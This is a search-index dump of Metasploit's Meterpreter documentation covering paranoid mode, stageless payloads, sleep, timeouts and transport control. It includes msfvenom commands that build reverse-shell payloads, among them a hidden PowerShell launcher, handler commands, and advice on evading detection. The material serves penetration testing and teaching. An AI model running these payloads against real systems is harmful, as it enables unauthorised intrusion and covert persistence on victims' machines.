    "content": "In some scenarios, it pays to be paranoid. This also applies to generating and handling Meterpreter sessions. This document walks through the process of implementing a paranoid Meterpreter payload and listener. Create a SSL/TLS Certificate . For best results, use a SSL/TLS certificate signed by a trusted certificate authority. Failing that, you can still generate a self-signed unified PEM using the following command: . $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\ -subj \"/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com\" \\ -keyout www.example.com.key \\ -out www.example.com.crt &amp;&amp; \\ cat www.example.com.key www.example.com.crt &gt; www.example.com.pem &amp;&amp; \\ rm -f www.example.com.key www.example.com.crt . Create a Paranoid Payload . For this use case, we will combine Payload UUID tracking and whitelisting with TLS pinning. For a staged payload, we will use the following command: . $ ./msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o launch-paranoid.bat $ head launch-paranoid.bat %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg... A stageless version of this would look like the following: . $ ./msfvenom -p windows/meterpreter_reverse_https LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless -f exe -o launch-paranoid-stageless.exe No platform was selected, choosing Msf::Module::Platform::Windows from the payload No Arch selected, selecting Arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 885314 bytes Saved as: launch-paranoid-stageless.exe . Create a Paranoid Listener . A staged payload would need to set the HandlerSSLCert and StagerVerifySSLCert options to enable TLS pinning and IgnoreUnknownPayloads to whitelist registered payload UUIDs: . $ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j' . A stageless version is only slightly different: . $ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j' . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html"
  },"442": {
    "doc": "Reliable Network Communication",
    "title": "Important note about resilient transports",
    "content": "Now that both TCP and HTTP/S payloads contain resiliency features, it’s important to know that exiting Metasploit using exit -y no longer terminates TCP sessions like it used to. If Metasploit is closed using exit -y without terminating existing sessions, both TCP and HTTP/S Meterpreter sessions will continue to run behind the scenes, attempting to connect back to Metasploit on the specified transports. If your intention is to exit Metasploit and terminate all of your sessions, then make sure you run sessions -K first. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html#important-note-about-resilient-transports",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html#important-note-about-resilient-transports"
  },"443": {
    "doc": "Reliable Network Communication",
    "title": "Reliable Network Communication",
    "content": "Of the many recent changes to Meterpreter, reliable network communication is one of the more welcomed ones. For a long time, Meterpreter’s communication with Metasploit has been relatively easy to break. Once broken, the session was officially dead, and the only way to get a session back was to replay the original exploitation path and establish a whole new session. In the case of HTTP/S transports, some resiliency features were present. Thanks to its stateless nature, HTTP/S transports would continue to attempt to talk to Metasploit after network outages or other unexpected problems as each command request/response is transmitted over a fresh connection. TCP based transports had nothing that would attempt to reconnect should some kind of network issue occur. Revamped transport implementations have provided support for resiliency even for TCP based communcations. Any session that isn’t properly terminated by Metasploit will continue to function behind the scenes while Meterpreter attempts to re-establish communications with Metasploit. It is also possible to control the behaviour of this functionality a little via the use of the various timeout values that can be specified when adding transports to the session, and also on the fly for the current transport. For full details, please see the timeout documentation for details on those timeout values. Behind the scenes, Meterpreter now maintains a circular linked list of transports in memory while running. When a transport fails, Meterpreter will shut down and clean up the current transport mechanism resources, and will move onto the next one in the list. From there, Meterpreter will use this transport configuration to attempt to reconnect to Metasploit. It will continue to make these attempts until one of the following occurs: . | The overall session timeout value is reached, at which point the session is terminated. | The Retry Total time for the transport is reached, at which point Meterpreter will move on to the next transport. | The connection attempt is successful, and communications is re-established with Metasploit. | . If Meterpreter has a single transport configured, then it will continue to retry on that single transport repeatedly until the session timeout is reached, or a session is successfully created. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html"
  },"444": {
    "doc": "Sleep Control",
    "title": "Silent shells",
    "content": "Noise during an assessment is not necessarily a good thing. With the advent of Meterpreter’s new support and control of multiple transports, Meterpreter has the ability to change transports and therefore change the traffic pattern for communication. However, sometimes this isn’t enough and sometimes users want to be able to shut the session off temporarily. The sleep command is designed to do just that: make the current Meterpreter session go to sleep for a specified period of time, and the wake up again once that time has expired. During this dormant period, no socket is active, no requests are made, and no responses are given. From the perspective of Metasploit it’s as if the Meterpreter session doesn’t exist. The interface to the sleep command looks like this: . meterpreter &gt; sleep Usage: sleep &lt;time&gt; time: Number of seconds to wait (positive integer) This command tells Meterpreter to go to sleep for the specified number of seconds. Sleeping will result in the transport being shut down and restarted after the designated timeout. As shown, sleep expects to be given a single postive integer value that represents the number of seconds that Meterpreter should be silent for. When run, the session will close, and then callback after the elapsed period of time. Given that Meterpreter lives in memory, this lack of communication will make it extremely difficult to track. The following shows a sample run where Meterpreter is put to sleep for 20 seconds, after which the session reconnects while the handler is still in background: . meterpreter &gt; sleep 20 [*] Telling the target instance to sleep for 20 seconds ... [+] Target instance has gone to sleep, terminating current session. [*] 10.1.10.35 - Meterpreter session 3 closed. Reason: User exit msf exploit(handler) &gt; [*] Meterpreter session 4 opened (10.1.10.40:6005 -&gt; 10.1.10.35:49315) at 2015-06-02 23:00:29 +1000 msf exploit(handler) &gt; sessions -i 4 [*] Starting interaction with 4... meterpreter &gt; getuid Server username: WIN-S45GUQ5KGVK\\OJ . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html#silent-shells",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html#silent-shells"
  },"445": {
    "doc": "Sleep Control",
    "title": "Under the hood",
    "content": "The implementation of this command was made rather simple as a result of the work that was done to support multiple transports. To facilitate this command, all that happens is: . | A transport change is invoked, but the transport that is selected as the “next” transport is the same as the currently active one. | The transport is shut down and the session is closed. | The timeout value is passed to a call to sleep(), forcing the main thread of execution to pause for the allotted period of time. | Execution resumes, and the resumption of connectivity continues in the usual transport switching fashion, only in this case, the transport that is fired up is the one that was just shut down. | . In short, the sleep command is a transport switch to the current transport with a delay. Simple! . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html#under-the-hood",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html#under-the-hood"
  },"446": {
    "doc": "Sleep Control",
    "title": "Sleep Control",
    "content": "There comes a time in the life of many a Meterpreter session when it needs to go quiet for a while. There are many reasons that this might be needed: . | During an assessment, the blue team may have detected suspicious activity, and communications is too noisy. | Long term engagements require long-term shells, but the red team isn’t awake 24-hours a day, and so keeping the communications active the whole time doesn’t make sense. | Users may just want to reduce the number of shells they have to worry about at a given time and want some of them to go away for a while. | . For these reasons, and more, the new sleep command in Meterpreter was created. This document explains what it is and how it works. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html"
  },"447": {
    "doc": "Stageless Mode",
    "title": "What is a staged payload?",
    "content": "A staged payload is simply a payload that is as compact as possible and performs the single task of providing the means for an attacker to upload something bigger. Staged payloads are often used in exploit scenarios due to the fact that binary exploitation often results in very little space for shellcode to be stored. The initial shellcode (often referred to as stage0) may create a new connection back to the attacker’s machine and read a larger payload into memory. Once the payload has been received, stage0 passes control to the new, larger payload. In Metasploit terms, this payload is called reverse_tcp, and the second stage (stage1) might be a standard command shell, or it might be something more complex, such as a Meterpreter shell or a VNC session. There are other staged options such as reverse_https and bind_tcp, both of which provide different transport options for opening the doorway for the second stage. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html#what-is-a-staged-payload",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html#what-is-a-staged-payload"
  },"448": {
    "doc": "Stageless Mode",
    "title": "Exploitation (recap) with staged Meterpreter",
    "content": "Staged Meterpreter is Meterpreter as we currently know it. Every time we set PAYLOAD windows/meterpreter/... we are asking Metasploit to prepare a payload that is broken into two stages, the second of which gives us a Meterpreter session. For the benefit of those who aren’t familiar with the process of exploitation with staged payloads, let’s take a look at what goes on when we use this payload to exploit a Windows machine using ms08_067_netapi. The following image is a representation of two machines, an attacker and a target. The former is running Metasploit with the ms08_067_netapi exploit configured to use a staged Meterpreter payload that has stage0 set to reverse_tcp using port 4444. The latter is an instance of Windows running a vulnerable implementation of SMB listening on port 445. When the payload is executed, Metasploit creates a listener on the correct port, and then establishes a connection to the target SMB service. Behind the scenes, when the target SMB service receives the connection, a function is invoked which contains a stack buffer that the attacking machine will overflow. The attacking machine then sends data that is bigger than the target expects. This data, which contains stage0 and a small bit of exploit-specific code, overflows the target buff. The exploit-specific code allows for the attacker to gain control over EIP and redirect process execution to the stage0 shellcode. At this point, the attacker has control of execution within the SMB service, but doesn’t really have the ability to do much else with it due to the size constraint. When stage0 (reverse_tcp) executes, it connects back to the attacker on the required port, which is ready and waiting with stage1. In the case of Meterpreter, stage1 is a DLL called metsrv. The metsrv DLL is then sent to the target machine through this reverse connection. This is what is happening when we see the “Sending stage …” message in msfconsole. The byte count that is shown in the “Sending stage” message represents the entire metsrv component as well as a configuration block. Once this has been pushed to the target machine, the stage0 shellcode writes this into memory. Once stage1 is in memory, stage0 passes control to it by simply jumping to the location where the payload was written to. In the case of metsrv, the first 60(ish) bytes is a clever collection of shellcode that also looks similar to a valid DOS header. This shellcode, when executed, uses Reflective DLL Injection to remap and load metsrv into memory in such a way that allows it to function correctly as a normal DLL without writing it to disk or registering it with the host process. It then invokes DllMain() on this loaded DLL, and the Meterpreter that we know and love takes over. From here, MSF pushes up two Meterpreter extension DLLs: stdapi and priv. Both of these are also reflectively loaded in the same way the original metsrv DLL was. At this point, Meterpreter is now ready and willing to take your commands. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html#exploitation-recap-with-staged-meterpreter",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html#exploitation-recap-with-staged-meterpreter"
  },"449": {
    "doc": "Stageless Mode",
    "title": "What’s wrong with staged Meterpreter?",
    "content": "Staged Meterpreter, in scenarios like that shown above, is a wonderful thing and works very well. However, the are other scenarios for compromise where this approach is less than ideal. In case you didn’t notice, in order to get a Meterpreter session running in the example scenario we uploaded the following: . | stage0: large buffer of junk plus approximately 350b of shellcode. | stage1: 32bit metsrv DLL approximately 169kb plus the configuration block. | stage2: 32bit stdapi DLL approximately 332kb. | stage3: priv DLL approximately 104kb. | . For a single session, the grand total of 605kb (ish) doesn’t feel like much. It’s certainly nothing compared to the 1mb+ we used to serve up! But when you end up in the situation where many shells come in at once, this adds up very quickly. The most common example of where this falls down is the case where penetration testers are in a low-bandwidth or high-latency environments and have pre-generated a staged Meterpreter binary that is then hosted outside of the attacker’s machine. Assessment targets download and invoke this binary, which results in the attacker gaining a Meterpreter shell on the target machine. The data or time cost of uploading metsrv, stdapi and priv for every single shell becomes unwieldy or outright impossible, even for a small number of shells. For large-scale compromise, via approaches such as GPO updates or SCCM packages, handling the volume of incoming connections at once can be bad enough; add the three DLL uploads to this mix and you have a recipe for lost shells and sadness. Nobody likes losing shells. Nobody likes sadness. It’s hard to believe it possible, but in this case the following image could be considered a nightmare. [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4684 opened .... [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4685 opened .... [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4686 opened .... [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4687 opened .... [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4688 opened .... [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4689 opened .... In such a scenario, it would be better to have the ability to create a stage0 which includes metsrv and any number of Meterpreter extensions. This means that the payload already includes the important part of the Meterpreter functionality, along with all the features that the attacker might require. When invoked, the Meterpreter instance already has all it needs to function, and hence Metasploit doesn’t need to waste time or bandwidth performing the usual uploads that are required with the staged approach. Stageless Meterpreter is exactly that. It is a binary that includes all of the required parts of Meterpreter, along with any required extensions, all bundled into one. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html#whats-wrong-with-staged-meterpreter",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html#whats-wrong-with-staged-meterpreter"
  },"450": {
    "doc": "Stageless Mode",
    "title": "What does stageless Meterpreter look like?",
    "content": "As with the staged version, stageless Meterpreter payloads begin with a small bootstrapper. However, this bootstrapper looks very different. Staged Meterpreter payload bootstrappers contain shellcode that performs network communications in order to read in the second stage prior to invoking it. The stageless counterparts don’t have this responsibility, as it is instead handled by metsrv itself. As a result, what we know as stage0 completely disappears. Instead, that which is known as stage1 in staged Meterpreter land becomes the bootstrapper for the payload in stageless Meterpreter land. To make this clear, let’s take a look at the process. When creating the payload, Metasploit first reads a copy of the metsrv DLL into memory. It then overwrites the DLL’s DOS header with a selection of shellcode that does the following: . | Performs a simple GetPC routine. | Calculates the location of the ReflectiveLoader() function in metsrv. | Invokes the ReflectiveLoader() function in metsrv. | Calculates the location of the start of a custom Configuration Block that contains information about transports, extensions and extension-specific initialisation scripts. This configuration block appears in memory immediately after metsrv. | Invokes DllMain() on metsrv, passing in DLL_METASPLOIT_ATTACH along with the pointer to the configuration block. This is where metsrv takes over. | . With this shellcode stub wired into the DOS header, Metasploit adds the entire binary blob to an in-memory payload buffer and then iterates through the list of chosen extensions. For each extension that is specified, Metasploit does the following: . | Loads the extension DLL into memory. | Calculates the size of the DLL. | Writes the size of the DLL as a 32-bit value to the configuration block. | Writes the entire body of the DLL, as-is, to the end of the conifiguration block. | . Once the end of the list of extensions is reached, the last thing that is written to the payload buffer is a 32-bit representation of 0 (NULL) which indicates that the list of extensions has been terminated. This NULL value is what metsrv will look for when iterating through the list of extensions so that it knows when to stop. After this, any extension initialisation scripts are wired in (though that’s beyond the scope of this article). The final payload layout looks like the following: . +-+--------+-----------------------------------------------------------+ | | Configuration Block |b|+-----------+-+---------+-+---------+-------+-----------+-+|o|| session |S|S| |N||o| metsrv || and |i| ext 1 |i| ext 2 | ... | ext inits |U||t|| transport |z|z| |L|| || config |e|e| |L|| |+-----------+-+---------+-+---------+-------+-----------+-+| +-+--------+-----------------------------------------------------------+ . This payload can be embedded in an exe file, encoded, thrown into an exploit (assuming there’s room!), and who knows what else! The important thing is that we now have all of the bits that we need in the one payload. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html#what-does-stageless-meterpreter-look-like",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html#what-does-stageless-meterpreter-look-like"
  },"451": {
    "doc": "Stageless Mode",
    "title": "How do I use stageless Meterpreter?",
    "content": "Firstly, it has a different name! It follows the same convention as all of the other staged vs stageless payloads: . | Payload | Staged | Stageless | . | Reverse TCP | windows/meterpreter/reverse_tcp | windows/meterpreter_reverse_tcp | . | Reverse HTTPS | windows/meterpreter/reverse_https | windows/meterpreter_reverse_https | . | Bind TCP | windows/meterpreter/bind_tcp | windows/meterpreter_bind_tcp | . | Reverse TCP IPv6 | windows/meterpreter/reverse_ipv6_tcp | windows/meterpreter_reverse_ipv6_tcp | . To create a payload using one of these babies, you use msfvenom just like you would any other payload. To make a stageless payload that contains only metsrv we do the following: . $ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 -f exe -o stageless.exe . To add extensions to the payload, we can make use of the EXTENSIONS parameter, which takes a comma-separated list of extension names. $ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe . With a payload created, we can set up a listener which will handle the connection using msfconsole. Note that the EXTENSIONS parameter isn’t set in the handler. This is because the handler isn’t responsible for them as they’re already in the payload binary. When a session is established, you’ll also note the lack of the “Sending stage …” message! This shows that the upload of stage1 didn’t happen as it’s not needed. If the payload that was invoked also contained stdapi and priv, then absolutely no uploads have occurred at this point. Congratulations, you’re dancing with stageless Meterpreter! . At this point, all of the pre-loaded extensions have been loaded into Meterpreter and are available for use. However, Metasploit is yet to know about them. To initiate client-site wiring of any of the pre-loaded extensions, the user can just type use &lt;extension&gt; just like they used to. Metasploit will check to see if the extension already exists in the target instance, and if it does, it will skip the extension upload and just wire-up the functions on the client side. If the extension is missing, then it will upload it and wire-up the functions on the fly just like it always has done. If you’re working with meterpreter_reverse_https, you’ll notice that when new shells come in they appear just like an orphaned instance. This is expected behaviour, because a stageless session can’t and won’t look any different to an old session that hasn’t been in touch with Metasploit for a while. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html#how-do-i-use-stageless-meterpreter",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html#how-do-i-use-stageless-meterpreter"
  },"452": {
    "doc": "Stageless Mode",
    "title": "Stageless Mode",
    "content": "Metasploit has long supported a mixture of staged and stageless payloads within its toolset. The mixture of payloads gives penetration testers a huge collection of options to choose from when performing exploitation. However, one option has been missing from this collection, and that is the notion of a stageless Meterpreter payload. In this post, I’d like to explain what this means, why you should care, and show how the latest update to Metasploit and Meterpreter provides this funky new feature as portended by Tod’s last Wrapup post. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html"
  },"453": {
    "doc": "Timeout Control",
    "title": "Meterpreter’s Timeout Values",
    "content": "There are four timeout values that can be controlled by the user, and they are documented in the sections below. Meterpreter Session Timeout . Each instance of Meterpreter has a lifetime that is defined as a session. The length of Meterpeter’s life is defined by a parameter called the Session Timeout. This value can be specified when Meterpreter payloads are generated by using the SessionExpirationTimeout datastore option. The default value used is the equivalent of one whole week (604800 seconds), and hence this is what is used if the user does not override the value manually. The session’s life begins at the point that metsrv (Meterpreter’s core) takes over from the initial stage (if there is one). Once running, the session timer begins, and Meterpeter will monitor this timeout so that as soon as it is reached the session will be closed. If the timeout value is set to zero, this tells Meterpreter to never kill the session. If you’re looking to have Meterpreter run for as long as it can, then setting this value to zero is the way to do it. It’s important to note that this value lives outside of the realms of the other timeout values. That is, this value applies to Meterpreter as a whole, where the other three timeouts are specific to the individual transports that have been configured within the session. Meterpreter Transport Timeouts . Each transport that is configured inside Meterpreter has three timeouts. The are as follows: . Communication Timeout . When Meterpreter talks to Metasploit packets are exchanged at a low level in a request/response fashion. In the case of TCP transports, this req/rep pattern is basically instant because TCP is a persistent connection. A request is handled by Meterpreter, and the response is immediately transferred as soon as the command has finished executing. In the case of HTTP/S payloads it’s slightly different because the protocols are stateless. Meterpreter makes a GET request to Metasploit to check to see if a command has been executed by the user. The command is returned, the connection is closed, and Meterpreter executes the command asynchronously. When the command execution finishes, a second request is made that POSTs the result back to Metasploit so that the user can consume it. Hence, for each command invocation, there are two HTTP/S requests. With TCP transports, communication “times out” when the time between the last packet and the current socket poll is greater than the communications timeout value. This happens when there are network related issues that prevent data from being transmitted between the two endpoints, but doesn’t cause the socket to completely disconnect. With HTTP/S transports, the communication “times out” for the same reason, but the evaluation of the condition is slightly different in that failure can occur because there is either no response at all from the remote server, or the response to a GET request results in no acknowledgement. By default, this value is set to 300 seconds (5 minutes), but can be overidden by the user via the SessionCommunicationTimeout setting. If connectivity fails, or the communication is deemed to have timed out. Then the current transport is destroyed, and the next transport in the list of transports is invoked. From there, Meterpreter will use the Retry Total and Retry Wait values while attempting to re-establish a session with Metasploit. Retry Total and Retry Wait . After a transport initialises inside Meterpreter, Meterpreter uses this transport to attempt to establish a new session with Metasploit. In some cases, Metasploit might not be availalble due to reasons like bad network connectivity, or a lack of configured listeners. If Meterpreter can’t connect to Metasploit, it will attempt to retry for a period of time. Once that period of time expires, Meterpreter will deem this transport “dead” and will move to the next one in the transport list. The total amount of time that Meterpreter will attempt to connect back to Metasploit on the given transport is indicated by the retry total value. That is, retry total is the total amount of time that Meterpreter will retry communication on the transport. The default value is 3600 seconds (1 hour), and can be overridden via the SessionRetryTotal setting. While the current time is within the retry total time, Meterpreter will constantly attempt to establish connectivity. If it fails, it will wait for a period of time before trying again. The time between retry attempts on the current transport is called retry wait. That is, Meterpreter will wait for the number of seconds specified in retry wait between each connection attempt on the current transport. The default value is 10 seconds, and can be overridden via the SessionRetryWait setting. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html#meterpreters-timeout-values",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html#meterpreters-timeout-values"
  },"454": {
    "doc": "Timeout Control",
    "title": "Changing Timeouts",
    "content": "Meterpreter supports the querying and updating of each of these timeouts via the console. In order to get the current timeout settings, users can invoke the get_timeouts command, which returns all four of the current timeout settings (one for the global session, and three for the transport-specific settings). An example of which is shown below: . meterpreter &gt; get_timeouts Session Expiry : @ 2015-06-09 19:56:05 Comm Timeout : 100000 seconds Retry Total Time: 50000 seconds Retry Wait Time : 2500 seconds . The Session Expiry value is rendered as an absolute local time so that the user knows when the session is due to expire. In order to update these values, users can invoke the set_timeouts command. Invoking it without parameters shows the help: . meterpreter &gt; set_timeouts Usage: set_timeouts [options] Set the current timeout options. Any or all of these can be set at once. OPTIONS: -c &lt;opt&gt; Comms timeout (seconds) -h Help menu -t &lt;opt&gt; Retry total time (seconds) -w &lt;opt&gt; Retry wait time (seconds) -x &lt;opt&gt; Expiration timout (seconds) . As the help implies, each of these settings takes a value that indicates the number of seconds. Each of the options of this command are optional, so the user can update only those values that they are interested in updating. When the command is invoked, Meterpreter is updated, and the result shows the updated values once the changes have been made. In the case of the -x parameter, the value that is to be passed in should represent the total number of seconds from “now” until the session should expire. The following example updates the session expiration timeout to be 2 minutes from “now”, and changes the retry wait time to 3 seconds: . meterpreter &gt; set_timeouts -x 120 -t 3 Session Expiry : @ 2015-06-02 22:45:13 Comm Timeout : 100000 seconds Retry Total Time: 3 seconds Retry Wait Time : 2500 seconds . This command can be invoked any number of times while the session is valid, but as soon as the session has expired, Metepreter will shut down and it’s game over: . meterpreter &gt; [*] 10.1.10.35 - Meterpreter session 2 closed. Reason: Died . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html#changing-timeouts",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html#changing-timeouts"
  },"455": {
    "doc": "Timeout Control",
    "title": "Timeout Control",
    "content": "It is now possible to meticulously control a set of timeout-related behaviour in Meterpreter sessions. Timeouts may not seem important, but they change the noise levels of Meterpreter’s communication resiliency features, and allow for the extension/reduction of time of the Meterpreter session as a whole. This document details what those timeouts are, and how to control them. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html"
  },"456": {
    "doc": "Transport Control",
    "title": "On this page",
    "content": ". | Transport configuration | The transport command . | Listing transports | Adding transports | Changing transports | Removing transports | Resilient transports | . | Supported Meterpreters | . The Meterpreter that we have known and loved for years has always had the ability to specify the type of transport that is to be used for the session. reverse_tcp and reverse_https are the favorites. Previously, the flexibility for transport selection is only available at the time the payloads are created, or when the exploit is launched, effectively locking the Meterpreter session into a single type of transport for the lifetime of the session. Recent modifications to Meterpreter have changed this. Meterpreter has a new configuration system that supports multiple transports and it now supports the addition of new transports while the session is still running. With the extra transports configured, Meterpreter allows the user to cycle through those transports without shutting down the session. Not only that, but Meterpreter will cycle through these transports automatically when communication fails. For more information on the session resiliency features, please view the [Meterpreter Reliable Network Communication][]. This document describes how multiple transports are added to an existing Meterpreter session. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html#on-this-page",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html#on-this-page"
  },"457": {
    "doc": "Transport Control",
    "title": "Transport configuration",
    "content": "It is not possible to add multiple transports to payloads or exploits prior to launching them. This is due to the fact that msfvenom the built-in payload mechanisms in Metasploit need to be modified to allow for multiple transports to be selected prior to the generation of the payload. This work is ongoing, and hopefully, it’ll be implemented soon. For now, a single transport has to be chosen, using the same mechanism that has always been in use. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html#transport-configuration",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html#transport-configuration"
  },"458": {
    "doc": "Transport Control",
    "title": "The transport command",
    "content": "Meterpreter has a new base command called transport. This is the hub of all transport-related commands and will allow you to list them, add new ones, cycle through them on the fly, and remove those which are no longer valid or useful. The following output shows the current help text for the transport command: . meterpreter &gt; transport Usage: transport &lt;list|change|add|next|prev|remove&gt; [options] list: list the currently active transports. add: add a new transport to the transport list. change: same as add, but changes directly to the added entry. next: jump to the next transport in the list (no options). prev: jump to the previous transport in the list (no options). remove: remove an existing, non-active transport. OPTIONS: -A &lt;opt&gt; User agent for HTTP/S transports (optional) -B &lt;opt&gt; Proxy type for HTTP/S transports (optional: http, socks; default: http) -C &lt;opt&gt; Comms timeout (seconds) (default: same as current session) -H &lt;opt&gt; Proxy host for HTTP/S transports (optional) -N &lt;opt&gt; Proxy password for HTTP/S transports (optional) -P &lt;opt&gt; Proxy port for HTTP/S transports (optional) -T &lt;opt&gt; Retry total time (seconds) (default: same as current session) -U &lt;opt&gt; Proxy username for HTTP/S transports (optional) -W &lt;opt&gt; Retry wait time (seconds) (default: same as current session) -X &lt;opt&gt; Expiration timout (seconds) (default: same as current session) -c &lt;opt&gt; SSL certificate path for https transport verification (optional) -h Help menu -i &lt;opt&gt; Specify transport by index (currently supported: remove) -l &lt;opt&gt; LHOST parameter (for reverse transports) -p &lt;opt&gt; LPORT parameter -t &lt;opt&gt; Transport type: reverse_tcp, reverse_http, reverse_https, bind_tcp -u &lt;opt&gt; Local URI for HTTP/S transports (used when adding/changing transports with a custom LURI) -v Show the verbose format of the transport list . Listing transports . The simplest of all the sub-commands in the transport set is list. This command shows the full list of currently enabled transport, and an indicator of which one is the “current” transport. The following shows the non-verbose output with just the default transport running: . meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 . The first part of the output is the session expiry time. To learn more about expiry time, see [Meterpreter Timeout Control][]. The above output shows that we have one transport enabled that is using TCP. We can infer that the transport was a reverse_tcp (rather than bind_tcp) due to the fact that there is a host IP address in the transport URL. If it was a bind_tcp, this would be blank. Comms T/O refers to the communications timeout value. Retry Total is the total time to attempt reconnects on this transport, and Retry Wait indicates how often a retry of the current transport should happen. Each of these is documented in depth in the Timeout documentation. The verbose version of this command shows more detail about the transport, but only in cases where extra detail is available (such as reverse_http/s). The following command shows the output of the list sub-command with the verbose flag (-v) after an HTTP transport has been added: . meterpreter &gt; transport list -v Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait User Agent Proxy Host Proxy User Proxy Pass Cert Hash ---- --- --------- ----------- ---------- ---------- ---------- ---------- ---------- --------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 Totes-Legit Browser/1.1 . Adding transports . Adding transports gives Meterpreter the ability to work on different transport mechanisms with the goal of keeping the sessions alive for longer. The command for adding new transports varies slightly depending on the transport that is being added. The following command shows a simple example that adds a reverse_http transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests: . meterpreter &gt; transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A \"Totes-Legit Browser/1.1\" [*] Adding new transport ... [+] Successfully added reverse_http transport. This command is what was used to create the transport that was listed in the sample verbose output for the transport list command. Here’s a deeper explanation of the parameters: . | The -t option is what tells Metasploit what type of transport to add. The options are bind_tcp, reverse_tcp, reverse_http and reverse_https. These match those that are used for the construction of the original payloads. Given that we are not dealing with stages, there is no reverse_winhttps because Meterpreter always uses the WinHTTP API behind the scenes anyway. | The -l option specifies what we all know as the LHOST parameter. | The -p option specifies what we all know as the LPORT parameter. | The -T option matches the retry total parameter. The measure of this value is in seconds, and should be a positive integer that is more than -W. | The -W option matches the retry wait parameter. The measure of this value is in seconds and should be a positive integer that is less than -T. | The -C option matches the communication timeout. The measure of this value is in seconds and should be a positive integer. | The -A specifies a custom user agent that is used for HTTP requests. | . It is also possible to specify the following: . | The -u option allows the addition of a local URI (LURI) value that is prepended to the UUID URI that is used for all requests. This URI value helps segregate listeners and payloads based on a URI. | The -H option 